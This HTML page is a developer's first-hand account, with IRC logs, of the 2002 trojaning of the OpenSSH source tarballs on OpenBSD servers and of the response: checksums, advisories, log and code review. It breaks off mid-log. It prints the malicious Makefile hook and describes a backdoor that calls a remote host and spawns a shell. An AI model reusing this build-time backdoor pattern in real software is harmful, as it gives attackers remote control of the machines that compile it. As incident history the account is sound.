@@ -1,0 +1,1703 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" lang="en">
+<head>
+<title>Trojaned OpenSSH</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta content="Miod Vallat" name="author">
+<link href="../../../m.css" type="text/css" rel="stylesheet">
+</head>
+<body>
+<div id="title">
+OpenBSD stories
+</div>
+<div id="path">
+<a href="../../../index.html">miod</a>
+&gt;
+<a href="../../index.html">software</a>
+&gt;
+<a href="../index.html">OpenBSD</a>
+&gt;
+<a href="index.html">stories</a>
+&gt;
+Trojaned OpenSSH
+<hr/>
+</div>
+<div id="content0">
+<h1>Trojaned OpenSSH</h1>
+
+<p>
+This is a story I had been considering writing for a long time, as many
+wrong or stupid things have been said or written at the time it happened.
+
+<p>
+Being on a quite sensitive subject, I have however opted to redact a few things,
+especially the identity of two OpenBSD developers, as well as some IP addresses
+and other minor details which could help identify them. They will be referred to
+as <i>dev1</i> and <i>dev2</i> in this story. It does not matter who they are,
+and they really are trustworthy.
+
+<hr/>
+
+<p>
+The month of august 2002 did not start well for OpenBSD.
+
+<p>
+The source archives (tarballs) of OpenSSH had been replaced with trojaned
+versions, without anyone at OpenBSD noticing. Other people started to notice
+this, and tried to reach us; at some point,
+<b>Alexander Guy</b>
+was notified on IRC.
+
+<p>
+It was shortly after 8am here in western Europe on august 1st, barely
+after midnight in Calgary, when he reported the problem on the OpenBSD
+developers' chat.
+
+<div id="pre">
+<pre>
+&lt;guy&gt; anyone awake, who wants to look at the fact that openssh 3.4 appears to be
+      trojaned on ftp.openbsd.org?
+&lt;miod&gt; WHAT?
+&lt;guy&gt; miod: check out bf-test.c in ssh-keygen
+&lt;miod&gt; -r--r--r--   1 12187    mirror     401466 Jul 31 16:48 openssh-3.4.tgz
+&lt;guy&gt; @ gcc bf-test.c -o bf-test; ./bf-test&gt;bf-test.out; sh ./bf-test.out &amp;
+&lt;miod&gt; not good
+&lt;guy&gt; that's out of makefile
+&lt;guy&gt; bf-test.out compiles a heredoc internally, which is network code..
+&lt;pval&gt; WTF
+&lt;miod&gt; pval, can you phone Bob ?
+&lt;guy&gt; connects to port 6667 @ 203.62.158.32
+&lt;pval&gt; I can and I will, but it's 12:30 am
+&lt;miod&gt; shit. do you know anyone who has access to the ftp server?
+&lt;pval&gt; Theo maybe?  He may be sleeping too though
+&lt;pval&gt; Is it only ftp.openbsd.org?
+&lt;pval&gt; Maybe I should just wake Bob up
+&lt;miod&gt; file on cvs is ok
+&lt;mickey&gt; you are in canada
+&lt;pval&gt; mickey, so?
+&lt;miod&gt; oh no, it's bad on cvs too
+&lt;miod&gt; argh
+&lt;pval&gt; lemme try his cell before i wake his family up
+&lt;pval&gt; ah, really
+&lt;mickey&gt; yo can call other dude
+&lt;miod&gt; I'll remove it temporarily
+&lt;pval&gt; How the #$#$ did it get trojaned?
+&lt;miod&gt; tell me.
+&lt;pval&gt; Oh you removed it already
+&lt;miod&gt; checking portable too
+&lt;guy&gt; http://www.andern.org/~a7r/outgoing/openssh_trojan.txt &lt;- pretty straight
+      forward looking
+&lt;pval&gt; That looks like the irssi and such trojans
+&lt;pval&gt; calling theo to let him know
+&lt;miod&gt; ok. portable looks correct from quick glance
+&lt;miod&gt; I really have to go, good luck managing this...
+&lt;mickey&gt; theo is at the ship
+&lt;pval&gt; talking to him
+&lt;mickey&gt; gut
+&lt;miod&gt; portable worries me still, because file is also dated jul 31 while sig is
+       one month old...
+&lt;miod&gt; -rw-rw-r--  1 djm     mirftp-ssh  840574 Jul 31 16:47 openssh-3.4p1.tar.gz
+&lt;miod&gt; -rw-rw-r--  1 djm     mirftp-ssh     232 Jun 26 08:20 openssh-3.4p1.tar.gz.sig
+&lt;pval&gt; delete it if it looks suspicious, miod
+&lt;pval&gt; halting all machines besides zeus and cvs
+&lt;miod&gt; no, I chmod it 000 so we can have a look
+&lt;pval&gt; sure
+&lt;mickey&gt; i  bozo dunno
+&lt;miod&gt; but I don't know what will happen on the mirrors, then - if permissions
+       will be picked or file removed or left or what.
+&lt;pval&gt; OK
+&lt;pval&gt; shutting down cvs per theo's request
+&lt;pval&gt; and heading over to his house
+&lt;pval&gt; in a few minutes i will halt it
+&lt;mickey&gt; i  dunno, i called him
+&lt;pval&gt; he just called me again a minute ago
+&lt;mickey&gt; und whats   ?
+&lt;pval&gt; asked me to do him a favour and shut down all machines basically for now
+</pre>
+</div>
+
+I had to leave to attend a funeral on that morning and could not do anything
+more.
+
+<p>
+Meanwhile, <b>Theo de Raadt</b> and <b>Peter Valchev</b> disconnected all
+OpenBSD systems from the network and started to inspect them, looking for
+tampering and suspicious activity.
+
+<p>
+A bit before 6am in Calgary, de Raadt put some systems back online and asked
+everyone to change passwords and ssh keys.
+
+<div id="pre">
+<pre>
+&lt;deraadt&gt; Do NOT move back to your old keys.
+&lt;deraadt&gt; Change all passwords.
+[...]
+&lt;deraadt&gt; please watch cvs and zeus very carefully
+&lt;deraadt&gt; gotta get some sleep now
+[...]
+&lt;deraadt&gt; i urge people to look around for changed things
+&lt;deraadt&gt; i cannot.  i've done what i can.
+&lt;deraadt&gt; pval is utterly beat too
+&lt;deraadt&gt; counting on you guys to cope
+&lt;deraadt&gt; PLEASE
+&lt;deraadt&gt; without help from people, i'm utterly getting to the point of giving
+          up
+&lt;deraadt&gt; it is not yet clear what exactly happened.  might be dev2's account.
+          if that log entry is false, it is root.
+&lt;jakob&gt; on what machine - cvs?
+&lt;deraadt&gt; yup.
+&lt;hugh&gt; Yes, looking that way.
+&lt;deraadt&gt; thought ~ftp is accessable from other machines.
+</pre>
+</div>
+
+Unfortunately, it was soon noticed that my idea of doing <tt>chmod 000</tt> on
+the files in order for them to no longer get fetchable by the ftp mirrors would
+not cause the files to disappear from the ftp mirrors.
+
+<p>
+Around 6:30am Calgary time, 2:30pm western Europe time:
+
+<div id="pre">
+<pre>
+&lt;wvdputte&gt; hia
+&lt;wvdputte&gt; Can somebody remove these files:
+&lt;henning&gt; heh wim.
+&lt;wvdputte&gt; &gt;     398595 -&gt;     401466 OpenSSH/openssh-3.4.tgz
+&lt;wvdputte&gt; &gt;     822567 -&gt;     825630 OpenSSH/portable/openssh-3.2.2p1.tar.gz
+&lt;wvdputte&gt; &gt;     837668 -&gt;     840574 OpenSSH/portable/openssh-3.4p1.tar.gz
+&lt;wvdputte&gt; all three where trojaned
+&lt;wvdputte&gt; the portable ones are still on ftp.openbsd.org and most files are on
+           all FTP mirrors
+&lt;deraadt&gt; -rw-rw-r--  1 dev2  mirftp-ssh  825630 May 21 23:28 openssh-3.2.2p1.tar.gz
+&lt;pval&gt; this one too?
+&lt;deraadt&gt; why do you say that one was?
+&lt;wvdputte&gt; extract it, it's 3.2.3 directory &amp; has bf-test.c
+&lt;pval&gt; chmod 000 did not clear the mirrors, apparently
+&lt;deraadt&gt; OF COURSE IT DOES NOT.
+&lt;deraadt&gt; Like, DUH.
+&lt;deraadt&gt; And whoever deleted one of those files
+&lt;deraadt&gt; I want them scolded.  That was very stupid.
+</pre>
+</div>
+
+<i>(I have never been scolded for this. But should this happen a second time, I
+would create a new directory, move the trojaned files to the directory, and
+chmod 000 these files and the directory, to cause the mirrors to delete the
+files rather than skip them.)</i>
+
+<p>
+Lead OpenSSH developer <b>Markus Friedl</b> was informed of the situation
+shortly after.
+
+<div id="pre">
+<pre>
+&lt;markus&gt; re
+&lt;hugh&gt; markus, how well apprised are you of current issues?
+&lt;markus&gt; i don't know
+&lt;hugh&gt; At a minimum an account with mirftp-ssh access has been compromised.
+&lt;markus&gt; well, i know about the problem.
+&lt;hugh&gt; We're currently trying to establish how badly cvs and or the tree has
+       been worked over, as well as close the hole.
+&lt;art&gt; I'm going to make diffs to the 3.1 CDs.
+</pre>
+</div>
+
+The correct, non-backdoored files were retrieved from the swedish mirror, who
+had not mirrored the trojaned files yet at this point, at 7:11am, Calgary time.
+
+<div id="pre">
+<pre>
+&lt;deraadt&gt; MD5 (openssh-3.4.tgz) = 39659226ff5b0d16d0290b21f67c46f2
+&lt;deraadt&gt; ?
+&lt;deraadt&gt; hello?
+&lt;deraadt&gt; MD5 (openssh-3.2.2p1.tar.gz) = 9d3e1e31e8d6cdbfa3036cb183aa4a01
+&lt;deraadt&gt; MD5 (openssh-3.4p1.tar.gz) = 459c1d0262e939d6432f193c7a4ba8a8
+&lt;deraadt&gt; ?
+&lt;deraadt&gt; i just put those up, from ftp.sunet.se
+&lt;deraadt&gt; they are right?
+&lt;jakob&gt; hold on.
+&lt;lebel&gt; <a href="https://slashdot.org/story/02/08/01/129228/openssh-package-trojaned">slashdot</a> now has a story up.
+&lt;jakob&gt; theo: the ones from sunet does not have the bf- files in openbsd-compat.
+&lt;deraadt&gt; in all 3?
+&lt;pval&gt; they appear fine (the ones in ~ftp)
+&lt;hugh&gt; yes
+&lt;deraadt&gt; OK, that would then be rather odd
+&lt;jakob&gt; openssh-3.4p1.tar.gz from sunet verifies against pgp sig
+&lt;deraadt&gt; how did it not end up with the bad 3.2.2p1
+</pre>
+</div>
+
+The OpenSSH source archives were in a group-writable directory. Members of that
+group were people who, as part of their OpenBSD activity, were allowed to
+publish files on the ftp server; these were mostly OpenSSH developers.
+
+<p>
+This would limit the compromission to, at most, only a few accounts. But which?
+
+<div id="pre">
+<pre>
+&lt;deraadt&gt; We've been very clear: it was [list of developers] or me... or it was
+          root
+[...]
+&lt;markus&gt; hugh, all we need to know is: 3 files got modified, in directories that
+         only [list of developers], theo and root can write into
+</pre>
+</div>
+
+<b>Wim Vandeputte</b>, who was running an ftp mirror in Europe, found evidence
+in his logs that the trojaned files had been placed two days earlier.
+
+<div id="pre">
+<pre>
+&lt;wvdputte&gt;  Tue, 30 Jul 2002 02:50:19 +0200 (CEST)
+&lt;wvdputte&gt; openssh-3.4 changed from 0206260812 -&gt; 0206260817
+&lt;wvdputte&gt; openssh-3.4p1.tar.gz changed from 0206260820 -&gt; 0207270905
+</pre>
+</div>
+
+<hr/>
+
+Meanwhile, other people were dissecting the backdoor.
+
+<p>
+To sum things up: an extra file, <tt>bf-test.c</tt>, masquerading as a test
+program for the
+<a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)">Blowfish</a>
+cipher algorithm, and the following line was added to the <tt>Makefile</tt>,
+to be run while compiling the sources:
+
+<div id="quote">
+<pre>
+@ $(CC) bf-test.c -o bf-test; ./bf-test&gt;bf-test.out; sh ./bf-test.out &amp;
+</pre>
+</div>
+
+<p>
+This line would cause the <tt>bf-test.c</tt> file to be compiled, then run,
+with its output redirected to a temporary file, which would then be run in the
+background using the user's shell.
+
+<p>
+That output was a shell script which would in turn create another file
+containing a simple C program, compile it and run it. That program would open a
+network connection to IP address 203.62.158.32 on port 6667, and wait for input;
+the other side could either let the program stop, let it wait for one hour, or
+spawn a shell (hardcoded to be <tt>/bin/sh</tt>), letting the other machine
+issue whichever commands it want from now on.
+
+<p>
+In other words, attempting to compile the trojaned OpenSSH code would allow the
+machine at 203.62.158.32 to run arbitrary commands with the credentials of the
+person doing the compile; which could very well be the <tt>root</tt> user.
+
+<p>
+This was a disaster. Thankfully, the packaging tools on most Linux
+distributions, as well as on FreeBSD, would verify the checksum of the source
+archive before attempting to do anything with this (which is likely how the
+tampering was noticed in the first place).
+
+<p>
+A comprehensive analysis was posted to
+<a href="https://en.wikipedia.org/wiki/Bugtraq">bugtraq</a>
+<a href="https://web.archive.org/web/20030605043845/http://www.securityfocus.com/archive/1/285492/2002-07-29/2002-08-04/0">later
+that day</a>.
+
+<hr/>
+
+<p>
+Within OpenBSD, people at this point were busy trying to assess the damage
+and searching for other possibly compromised files.
+
+<div id="pre">
+<pre>
+&lt;niels&gt; does it make sense to compare cvs src against src on released cds?
+&lt;niklas&gt; art is doing that
+&lt;deraadt&gt; try
+&lt;henning&gt; theo, i'm reading diffs since cvs came up again
+</pre>
+</div>
+
+We also had to check all the connections to <tt>cvs.openbsd.org</tt> made at
+the time of the file replacement, and before.
+
+<div id="pre">
+<pre>
+&lt;djm&gt; if someone can email me a list of my recent connections to cvs, i can
+      highligh any which look suspicious
+&lt;djm&gt; that could narrow it down some
+[...]
+&lt;markus&gt; how many connects from the trojan target? (203.62.158.32)
+&lt;djm&gt; whois.apnic.net tells me that address is ib melbourne
+&lt;djm&gt; maybe i should go round and ask them
+&lt;hugh&gt; the guy took the machine down, claims someone compromised him
+&lt;niels&gt; seems likely
+&lt;djm&gt; i don't understand - you are a cracker, you crack cvs.openbsd.org
+      and all you do is add an obvious trojan to a file without even deleting
+      the pgp sig
+&lt;djm&gt; it doesn't make sense
+&lt;markus&gt; pval and theo already phoned 203.62.158.32
+&lt;markus&gt; they are probably broken into, too.
+&lt;niklas&gt; but it's an IP# not a phoneno :-)
+&lt;djm&gt; a first pass through the portable 3.4p1-&gt;HEAD diffs shows nothing
+      suspicious
+&lt;markus&gt; djm, what are you checking? cvs?
+&lt;djm&gt; portable cvs
+&lt;djm&gt; in case it was my account that was hiijacked
+&lt;kjell&gt; do we know what in what timeframe the file was changed?
+&lt;niklas&gt; last 24 hours
+&lt;markus&gt; wim, the mirror logs could tell?
+&lt;niels&gt; i sent out a little mini advisory to some ppl asking for feedback.
+&lt;miod&gt; trojaned files were dated 07/31 16:4x local time.
+</pre>
+</div>
+
+Evidence of a tampered account was soon found. A particular developer asked me,
+similarly to djm but in private messages, if I could give him a list of the
+connections to his account.
+
+<p>
+I ran a quick grep and had the unpleasant surprise of finding the address of the
+machine the backdoor would connect to, in his connection logs.
+
+<div id="pre">
+<pre>
+&lt;miod&gt; Jul 31 16:44:53 cvs sshd[15840]: Accepted publickey for dev2 from 203.62.158.32 port 65502 ssh2
+&lt;miod&gt; oops, was meant as a /m <i>[private message]</i>
+&lt;wvdputte&gt; Name:    web.snsonline.net
+&lt;wvdputte&gt; Address:  203.62.158.32
+&lt;dev2&gt; it's the target ip of the backdor
+&lt;dev2&gt; so, it's me or root modifying the logs.
+&lt;miod&gt; all connections from dev2 are XXX.YYY.ZZZ.TTT but this one, indeed.
+&lt;djm&gt; or your evil twin
+&lt;miod&gt; dev2, know AAA.BBB.CCC.DDD too ?
+&lt;miod&gt; Aug  1 06:21:11 cvs sshd[22382]: Failed none for illegal user dev2 from AAA.BBB.CCC.DDD port 28950
+&lt;miod&gt; happens twice
+&lt;miod&gt; the second time a few minutes later on 28952
+&lt;dev2&gt; AAA.BBB.CCC.DDD is where i work
+&lt;miod&gt; oh, ok.
+&lt;dev2&gt; my accounts was disabled at that time
+</pre>
+</div>
+
+Meanwhile, <b>Niels Provos</b> was working on the security advisory.
+
+<div id="pre">
+<pre>
+&lt;niels&gt; does anyone have the correct md5 sums?  so i can put them in a prelim
+        advisory?
+&lt;djm&gt; 459c1d0262e939d6432f193c7a4ba8a8  dist/openssh-3.4p1.tar.gz
+&lt;djm&gt; the GPG sig should also match
+&lt;djm&gt; d5a956263287e7fd261528bb1962f24c  dist/openssh-3.4p1.tar.gz.sig
+&lt;niels&gt; MD5 (openssh-3.4p1.tar.gz) = 459c1d0262e939d6432f193c7a4ba8a8
+&lt;niels&gt; anyone has md5 sums for the other versions?
+&lt;niels&gt; i need md5 for 3.4 and 3.2.2p1
+&lt;djm&gt; check the gpg sigs - i don't have md5s
+&lt;dugsong&gt; niels: http://www.freebsd.org/cgi/cvsweb.cgi/ports/security/openssh-portable/distinfo
+&lt;dugsong&gt; and compare to what distfiles we have
+&lt;niels&gt; working on it.
+[...]
+&lt;djm&gt; Good:
+&lt;djm&gt; 9d3e1e31e8d6cdbfa3036cb183aa4a01  openssh-3.2.2p1.tar.gz
+&lt;djm&gt; be4f9ed8da1735efd770dc8fa2bb808a  openssh-3.2.2p1.tar.gz.sig
+&lt;djm&gt; i am downloading all the releases now, will check gpg sigs and do a bulk
+      md5 on them
+</pre>
+</div>
+
+People were also discussing the backdoor itself.
+
+<div id="pre">
+<pre>
+&lt;djm&gt; that has got to be the dumbest trojan i have ever seen
+&lt;art&gt; why?
+&lt;niklas&gt; why what? many assertions were made..
+&lt;hugh&gt; It's the same style trojan that was in the irssi distribution a while
+       back.
+&lt;djm&gt; you have write access to cvs and the best you can do is a build-time
+      trojan?
+&lt;lebel&gt; even I would had done more :)
+&lt;kjell&gt; so, either a dumbass figured a clever way of inserting a file onto CVS,
+        or there's something clever to be found.
+&lt;miod&gt; you can not understand what goes inside the head of a script kiddie.
+&lt;kjell&gt; but why draw attention to yourself with a dumbass, easily detected
+        trojan?
+&lt;djm&gt; scriptkiddies don't break cvs
+&lt;aaron&gt; havent been on in awhile, was it determined if user-level or root-level
+        access was acquired?
+&lt;niklas&gt; looks like user-level
+&lt;niklas&gt; but it can be root altering logs
+&lt;markus&gt; back
+&lt;lebel&gt; given that the guy didn't change timestamps too.
+&lt;henning&gt; miod, assuming the guy was just stupid is too dangerous here. we need
+          to check careful.
+&lt;hugh&gt; we have found no proof root was compromised, but can't disprove a
+       negative..
+&lt;miod&gt; henning, I agree.
+[...]
+&lt;dugsong&gt; the backdoor was made to draw attention, with the same "signature" as
+          the dsniff/irssi/BitchX backdoors
+&lt;wvdputte&gt; mirrors started picking it up between 0h49 and 02h56 CET 01/08/2002
+&lt;dugsong&gt; nobody serious about backdooring openssh would have done it like this.
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="pre">
+<pre>
+&lt;aaron&gt; anyway, more important now to figure out what else is damaged rather
+        than what happened, but the forensics are interesting
+&lt;niels&gt; which vendor lists should i sent to?
+&lt;niels&gt; cert, too?
+&lt;markus&gt; 2nd mail from cert.
+&lt;dugsong&gt; hugh: or pass on to CERT, if we agree
+&lt;markus&gt; cert sent me mail
+&lt;niels&gt; send to freebsd-security, and ...?
+&lt;hugh&gt; our lists, bugtraq, unix-dev, cert?
+&lt;markus&gt; i bounced to verndor-sec
+</pre>
+</div>
+
+That discussion wouldn't last long, everyone was reminded that, at this point,
+we had no idea if anything else had been tampered in <tt>cvs.openbsd.org</tt>,
+and a collegial verification of the source code was in order.
+
+<div id="pre">
+<pre>
+&lt;art&gt; There is 40MB diff between 3.1 and -current. There is no chance that I
+      will be able to read all of that and not miss something important. Is
+      someone else doing some reading? We need to coordinate.
+</pre>
+</div>
+
+Provos published the advisory, less than ten hours after the trojaned
+files were noticed.
+
+<div id="quote">
+<pre>
+CVSROOT:        /cvs
+Module name:    www
+Changes by:     provos@cvs.openbsd.org  2002/08/01 09:50:48
+
+Added files:
+        advisories     : ssh_trojan.txt
+
+Log message:
+trojaned distribution files
+</pre>
+</div>
+
+The advisory can still be found online those days, at
+<a href="https://www.openbsd.org/advisories/ssh_trojan.txt">https://www.openbsd.org/advisories/ssh_trojan.txt</a>:
+
+<div id="quote">
+<pre>
+OpenSSH Security Advisory (adv.trojan)
+
+1. Systems affected:
+
+OpenSSH version 3.2.2p1, 3.4p1 and 3.4 have been trojaned on the
+OpenBSD ftp server and potentially propagated via the normal mirroring
+process to other ftp servers.  The code was inserted some time between
+the 30th and 31th of July.  We replaced the trojaned files with their
+originals at 7AM MDT, August 1st.
+
+2. Impact:
+
+Anyone who has installed OpenSSH from the OpenBSD ftp server or any
+mirror within that time frame should consider his system compromised.
+The trojan allows the attacker to gain control of the system as the
+user compiling the binary.  Arbitrary commands can be executed.
+
+3. Solution:
+
+Verify that you did not build a trojaned version of the sources.  The
+portable SSH tar balls contain PGP signatures that should be verified
+before installation.  You can also use the following MD5 checksums for
+verification.
+
+MD5 (openssh-3.4p1.tar.gz) = 459c1d0262e939d6432f193c7a4ba8a8
+MD5 (openssh-3.4p1.tar.gz.sig) = d5a956263287e7fd261528bb1962f24c
+MD5 (openssh-3.4.tgz) = 39659226ff5b0d16d0290b21f67c46f2
+MD5 (openssh-3.2.2p1.tar.gz) = 9d3e1e31e8d6cdbfa3036cb183aa4a01
+MD5 (openssh-3.2.2p1.tar.gz.sig) = be4f9ed8da1735efd770dc8fa2bb808a
+
+4. Details
+
+When building the OpenSSH binaries, the trojan resides in bf-test.c
+and causes code to execute which connects to a specified IP address.
+The destination port is normally used by the IRC protocol.  A
+connection attempt is made once an hour.  If the connection is
+successful, arbitrary commands may be executed.
+
+Three commands are understood by the backdoor:
+
+Command A:  Kill the exploit.
+Command D:  Execute a command.
+Command M:  Go to sleep.
+
+5. Notice:
+
+Because of the urgency of this issue, the advisory may not be
+complete.  Updates will be posted to the OpenSSH web pages if
+necessary.
+</pre>
+</div>
+
+It is also mentioned on OpenSSH's security page,
+<a href="https://www.openbsd.org/openssh/security.html">https://www.openbsd.org/openssh/security.html</a>,
+with this comment:
+
+<div id="quote">
+<pre>
+OpenSSH version 3.2.2p1, 3.4p1 and 3.4 were trojaned on the OpenBSD FTP server
+and potentially propagated via the normal mirroring process to other FTP
+servers. The code was inserted some time between the 30th and 31th of July. We
+replaced the trojaned files with their originals at 7AM MDT, August 1st.
+</pre>
+</div>
+
+and duplicated as
+<a href="https://www.openssh.org/txt/trojan.adv">https://www.openssh.org/txt/trojan.adv</a>.
+
+<p>
+At some point, I let my mind wander a bit and put a coin back in the <i>"what
+if?"</i> machine.
+
+<div id="pre">
+<pre>
+&lt;miod&gt; it would be so easy to add exactly the same backdoor to usr.bin/ssh in
+       the tree...
+&lt;kjell&gt; and we still don't know how they got in.
+&lt;dugsong&gt; they did not touch any other files on monkey, when they backdoored
+          dsniff/fragroute
+&lt;dugsong&gt; but they left ~dirt/.bash_history
+&lt;art&gt; Ah. so now we know who it was. :)
+</pre>
+</div>
+
+Interestingly, because the advisory mentioned files on ftp, people would
+start thinking that the compromised system was the main ftp server, not
+<tt>cvs.openbsd.org</tt>.
+
+<p>
+Also, a separate advisory written by
+<a href="https://www.mavetju.org/unix/openssh-trojan.php">Edwin Groothuis</a>
+and published a few moments before Provos' mentioned that
+"A Trojaned version of OpenSSH package has been found to reside on
+<tt>ftp.openbsd.org</tt>'s server" and may have contributed to the confusion.
+
+<p>
+This was a welcome diversion, as people would discuss the security of
+<tt>ftp.openbsd.org</tt> (a Sun system running Solaris) rather than of
+<tt>cvs.openbsd.org</tt> (an x86 system running OpenBSD).
+
+<div id="pre">
+<pre>
+&lt;niels&gt; sigh.  everybody thinks now that it is ftp.openbsd.org that got
+        compromised :-(
+&lt;millert&gt; Because it is Solaris ;-)
+&lt;lebel&gt; isn't ftp.openbsd.old an old SunOS box?
+&lt;millert&gt; Solaris, not SunOS
+&lt;lebel&gt; well, the ftp banner is deceptive then: 220 merlin FTP server (SunOS
+        4.1) ready.
+&lt;kjell&gt; beck does that
+&lt;millert&gt; Yes, it is deceptive.
+&lt;kjell&gt; see smtpd
+&lt;ckuethe&gt; beck doesn't work here.
+&lt;ckuethe&gt; but i'll bug larry in about 5 minutes
+</pre>
+</div>
+
+Among the changes made since the
+<a href="https://www.openbsd.org/31.html">OpenBSD 3.1</a>
+release, one of the largest and most painful to review was the upgrade of the
+in-tree copy of
+<a href="https://en.wikipedia.org/wiki/GNU_Project">GNU</a>
+<a href="https://en.wikipedia.org/wiki/GNU_Binutils">binutils</a>
+from 2.10.1 to 2.11.2.
+
+<div id="pre">
+<pre>
+&lt;art&gt; Sigh.. comeone could hide hindenburg in binutils and noone would notice.
+&lt;art&gt; A smart cracker would trojan libbfd.
+[...]
+&lt;art&gt; ROTFL!
+&lt;art&gt; -       memset(frag_now,  SIZEOF_STRUCT_FRAG, 0);
+&lt;art&gt; +       memset(frag_now, 0, SIZEOF_STRUCT_FRAG);
+&lt;art&gt; binutils. :)
+&lt;millert&gt; Yeah, there were a bunch of those.
+&lt;dugsong&gt; wow
+&lt;millert&gt; Some moron fucked up converting from bzero I bet
+</pre>
+</div>
+
+<b>Art Grabowski</b> was checking diffs at an amazing speed.
+
+<div id="pre">
+<pre>
+&lt;art&gt; lots of diff in texinfo and sendmail.
+&lt;millert&gt; Yeah, the sendmail ones will be large.
+&lt;millert&gt; The way to diff sendmail is against the stock sendmail sources
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="pre">
+<pre>
+&lt;hugh&gt; Where did the diffs against 3.1 get put?
+&lt;art&gt; hugh, make your own.
+&lt;art&gt; safer that way.
+&lt;art&gt; The whole point of this excercise is redundancy.
+&lt;art&gt; bleah. 18MB diff left after gnu and kerberos.
+</pre>
+</div>
+
+On the next day, august 2nd, we were still operating in <i>"damage control"</i>
+mode.
+
+<div id="pre">
+<pre>
+&lt;deraadt&gt; i have disabled all accounts that have not yet changed their passwords
+</pre>
+</div>
+
+<b>Bob Beck</b> would upload the latest offsite tape backup of the source code
+repositories.
+
+<div id="pre">
+<pre>
+&lt;beck&gt; ok. ~beck/cvs.jul23.tar.gz now scp'ing in
+&lt;beck&gt; when it gets there, it'll have:
+&lt;beck&gt; MD5(cvs.jul23.tar.gz)= f9052c9c9d3acf4f47dcea9d95852d3b
+&lt;pval&gt; how big is it?
+&lt;beck&gt; it's the repositories from jul 23 tape backup, from sunsite.
+[...]
+&lt;beck&gt; -rw-r--r--   1 root     other    358847571 Aug  1 20:17 cvs.jul23.tar.gz
+&lt;beck&gt; there's enough room there.
+&lt;beck&gt; looks like it'll take about 30 minutes.
+&lt;beck&gt; last commit to it was mickey's non-executable stack stuff
+</pre>
+</div>
+
+However, while the upload was progressing, I had a private conversation with
+<i>dev2</i>, which made me realise that <i>someone™</i> should at least initiate
+the work on checking everyone's past connections to <tt>cvs.openbsd.org</tt>.
+
+<p>
+So I started splitting the <tt>/var/log/authlog</tt> files (which register all
+the successful and failed logins using <tt>ssh</tt>), first by account name,
+then by source IP address, in order to try to check all these IPs.
+
+<div id="pre">
+<pre>
+*dev2* any news?
+-&gt; *dev2* any news on what?
+*dev2* openbsd
+*dev2* or on the diff checking
+-&gt; *dev2* well, I guess everyone is slowly checking diffs, Bob uploaded a
+          likely-safe repo mirror grom 07/23 which makes easier to diff against.
+*dev2* are you still in wheel?
+*dev2* we could do for i in *; do grep $i /var/log/authlog| mail $i; done
+*dev2* and everyone checks
+*dev2* or not mail
+-&gt; *dev2* yes, but only Theo and pval have tho new root pw so far.
+-&gt; *dev2* oh... why not.
+*dev2* be careful not to mail
+*dev2* but store somewhere?
+-&gt; *dev2* yep.
+*dev2* closed accounts and so on
+[...]
+*dev2* you can mail me my authlog, so i can check, ok? i won't login before
+       laptop is reinstalled
+-&gt; *dev2* sure, wait until grepping is ready
+-&gt; *dev2* is your .forward ok?
+*dev2* yes i get mail from openbsd.org, what is in my fwd
+-&gt; *dev2* sent
+*dev2* [all caps expletive deleted]
+*dev2* i don't know 129.242.13.151
+-&gt; *dev2* lgserv3.stud.cs.uit.no
+-&gt; *dev2* July 25th, eh..
+*dev2* eh
+*dev2* yes
+-&gt; *dev2* I guess you've never been in norway during july.
+*dev2* na
+*dev2* lgserv3.stud.cs.uit.no is probably compromised, too
+-&gt; *dev2* so we can consider you key compromised starting this day.
+*dev2* everyone should check
+-&gt; *dev2* want me to check &lt; 07/24 logs for your key?
+*dev2* well, unless someone modified .ssh/authorized_keys
+*dev2* or sshd is broken
+*dev2* you can mail me
+-&gt; *dev2* ok, whole log.
+-&gt; *dev2* only one connection from there
+*dev2* only my account?
+-&gt; *dev2* checking ...
+-&gt; *dev2* yes, only yours.
+*dev2* so i'm not paranoid enough
+*dev2* you can grep -v AAA.BBB.CCC.DDD |grep -v XXX.YYY |grep -v EEE.FFF.GGG.HHH
+-&gt; *dev2* your pubkey had a password?
+*dev2* so this is why i have no idea
+*dev2* of cours
+*dev2* 30 chars
+-&gt; *dev2* wow.
+*dev2* but i run the agent
+*dev2* i think 30 cahrs
+*dev2* i use the ssh-agent from laptop
+*dev2* helps against trojans
+*dev2* in ssh client
+-&gt; *dev2* your grep still lists a lot of addresses for your logins
+*dev2* and protocol detection for MITM
+*dev2* can you mail me?
+*dev2* there could be other dialin domains for modem instead of dsl
+*dev2* ah you did
+*dev2* and there could be hosts for when i was at niels/c2k2/usenix
+-&gt; *dev2* compare with dates, then.
+*dev2* can you find more  209.115.217.214
+*dev2* it's c2k2 i think
+-&gt; *dev2* only in your logs.
+-&gt; *dev2* no reverse dns.
+-&gt; *dev2* but dates 06/10 and 06/11 match
+-&gt; *dev2* or this might have been usenix.
+*dev2* yes, perhaps
+*dev2* whois does now work from here
+-&gt; *dev2* wait, bad grep, lots of 209.115.217.214 in other peoples' files.
+-&gt; *dev2* yikes! to ssh -lroot during c2k2
+*dev2* -lroot ?
+-&gt; *dev2* "Accepted password for root from 209.bork.bork.bork. Likely theo when he
+          created pb, hennings and mdw account, in two sessions.
+*dev2* probably
+*dev2* i think it could have been at Niels
+*dev2* at CITI
+*dev2* httpd bug was not public
+*dev2* i had httpd running
+*dev2* should i mail to abuse@ ?
+-&gt; *dev2* dunno.
+-&gt; *dev2* I agree with Niels that you should at least contact the admins of those
+          two ip to warn them.
+*dev2* the 1st was contacted yester day. it's the target of the trojan
+*dev2* i'll contact the 2nd.
+*dev2* via abuse? or what?
+*dev2* root@ ?
+-&gt; *dev2* both. abuse might not exist.
+*dev2* hm, should everyone ask you about connection logs? just in case?
+-&gt; *dev2* I'm polishing the logs to get, for everyone, all the ip they have been
+          connecting from (or trying to connect). then I'll ask everyone to
+          confirm they have been using those ip.
+</pre>
+</div>
+
+Meanwhile, the source tree review was progressing.
+
+<div id="pre">
+<pre>
+&lt;henning&gt; what is left over? I' through etc/ and half through duistrib/
+&lt;markus&gt; disturb
+&lt;art&gt; henning. Everything is left.
+&lt;art&gt; I've read everything.
+&lt;art&gt; But at the end my brain was a bit spongy.
+&lt;henning&gt; yes, everything should be read by at least two people, but does it
+          really make sense that everybody of us reads all?
+&lt;art&gt; read usr.bin and usr.sbin
